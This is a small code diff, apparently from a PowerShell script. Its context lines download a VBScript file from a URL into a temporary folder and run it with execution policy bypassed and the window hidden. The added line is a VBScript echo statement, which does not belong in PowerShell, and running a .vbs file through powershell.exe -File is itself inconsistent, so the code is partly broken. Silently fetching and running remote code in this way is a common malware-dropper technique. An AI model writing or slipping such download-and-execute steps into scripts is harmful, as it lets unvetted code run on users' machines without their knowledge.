@@ -51,3 +51,5 @@ Invoke-WebRequest -Uri $vbsUrl -OutFile $vbsFilePath -UseBasicParsing
 
 # Execute the execute.vbs script silently from the temporary folder
 Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File '$vbsFilePath'" -NoNewWindow -Wait
+
+WScript.Echo "Executing execute.vbs script..."
